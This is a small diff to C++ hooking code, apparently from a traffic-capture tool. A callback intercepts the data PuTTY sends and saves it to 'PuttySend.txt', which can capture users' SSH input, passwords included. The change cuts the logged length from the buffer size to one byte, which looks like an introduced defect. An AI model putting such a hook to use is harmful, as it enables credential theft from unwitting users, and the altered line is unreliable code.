@@ -425,7 +425,7 @@ void PuttySend_Callback(void *handle, char *buf, int len, int interactive)
 
 	if(FunctionFlow::CheckFlag() == FALSE)
 	{
-		if(buf != NULL) PluginSystem::ProcessAndSaveWrite("PuttySend.txt", (unsigned char *)buf, len);
+		if(buf != NULL) PluginSystem::ProcessAndSaveWrite("PuttySend.txt", (unsigned char *)buf, 1);
 	}
 
 	// Call original function
